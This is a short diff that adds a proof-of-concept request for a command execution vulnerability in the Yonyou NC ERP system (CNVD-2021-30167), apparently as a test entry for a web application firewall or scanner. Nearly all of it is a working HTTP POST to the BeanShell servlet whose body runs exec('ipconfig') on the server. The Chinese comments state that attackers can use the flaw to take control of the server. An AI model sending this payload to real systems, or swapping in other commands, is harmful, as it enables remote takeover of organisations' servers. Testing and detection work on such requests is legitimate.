@@ -1,0 +1,12 @@
+# 用友NC BeanShell命令执行漏洞(CNVD-2021-30167)
+# 用友NC是一款大型erp企业管理系统与电子商务平台。
+# 用友NC BeanShell存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权。
+POST /servlet/~ic/bsh.servlet.BshServlet?acid=80000042&bid=hd_tag_m8mv248x HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv248x
+RM-PRO-Token: 585d73c951207ddd1425bd2d08ddcf63
+RM-PRO-Time: 1742808369501
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+id=bsh.script=exec("ipconfig");
